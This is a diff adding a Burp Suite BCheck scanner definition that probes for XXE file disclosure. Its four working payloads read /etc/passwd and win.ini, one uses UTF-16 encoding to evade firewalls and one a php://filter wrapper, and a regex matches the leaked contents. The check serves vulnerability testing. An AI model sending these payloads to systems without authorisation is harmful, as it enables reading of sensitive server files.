@@ -1,0 +1,23 @@
+metadata:
+    language: v2-beta
+    name: "XXE - Classic File Read with WAF Bypass"
+    description: "Tests for XXE with file disclosure payloads using encoding bypass"
+    author: "BCheck Arsenal"
+    tags: "xxe", "file-read", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
+            - "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"
+
+    if {check.response} matches "(root:x:|\[fonts\]|\[extensions\]|PD9waH)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "XXE file disclosure detected. The XML parser processes external entities."
+            remediation: "Disable external entity processing in XML parsers."
+    end if
